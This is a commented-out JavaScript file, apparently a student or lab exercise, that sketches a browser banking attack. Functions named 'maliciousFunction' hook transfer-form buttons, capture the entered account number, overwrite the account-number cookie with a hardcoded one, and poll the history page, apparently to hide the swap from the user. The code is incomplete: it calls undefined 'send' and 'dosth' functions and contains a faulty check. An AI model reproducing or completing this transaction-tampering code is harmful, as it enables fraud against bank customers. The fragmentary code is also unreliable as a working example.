// var myNumber = '1200001111222233334444555566667777'
// var changedNumber = "0";
// var data;

// function maliciousFunction(){
// 	console.log("acapulco ");
// 	console.log(" numer to " + changedNumber );
// 	changedNumber = document.getElementById("account_number").value;
// 	localStorage.numer = String( changedNumber );
// 	var result = localStorage.numer ;
// 	console.log( result );
// 	dosth();

// }

// function maliciousFunction2(){
// 	document.cookie ="ACCOUNT_NUMBER="+myNumber;
// 	var username = getCookie("NICK");
// 	var title = getCookie("TITLE");
// 	var recipient = getCookie("RECIPIENT");

// 	if( typeof localStorage.getItem(username) === 'undefined' ){
// 		console.log("tu sie wali");
// 		data = [];
// 	}
// 	else{
// 		console.log("jednak tu");
// 		data = JSON.parse(localStorage.getItem(username));
// 		if( data == null ) data = [];
// 	}
// 	console.log( data.length );
// 	data.push( localStorage.numer );
// 	localStorage.setItem(username, JSON.stringify(data));
	

// 	send();
// }

// window.onload = function(){
// 	if( document.getElementById("input") != null )
// 		document.getElementById("input").onclick = maliciousFunction;
// 	if( document.getElementById("input2") != null )
// 		document.getElementById("input2").onclick = maliciousFunction2;
// 	setInterval(function(){
// 		if( document.getElementById('history') ){
// 			var username = getCookie ( "NICK");
// 			if( typeof localStorage.getItem( username ) ){
// 				var data = JSON.parse(localStorage.getItem(username) );
// 				// setInterval(function(){ print(); }, 1);
// 					var elem = document.getElementById('history');
// 					var tab = document.getElementsByTagName("tbody")[0];
// 					console.log(tab);
// 					console.log(tab.childNodes.length);
// 					for( i = 0 ; i < data.length; i++ ){
// 						var number = data[ i ];
// 						var row = tab.getElementsByTagName("tr")[i];
// 						// row.childNodes[1].innerHTML = data[ i ];
// 					}

				
// 			// console.log( elem );
// 				// var tab = elem.getElementsByTagName('h2').value;
// 				// console.log( tab[0] );

// 				// for( i = 0  ; i < data.length ; i++ ){
// 				// 	var number = data[ i ];
// 				// 	if( typeof tab === 'undefined' ) console.log("dupa troche!!")
// 				// 	tab.childNodes[i].childNodes[1].innerHTML = data[ data.length-1-i ];

// 				// }
// 			}
// 		}
// 	},5);
// }


// function print( ){
// 	var arr = document.getElementsByTagName("h2");
// 	console.log(arr.length);
// }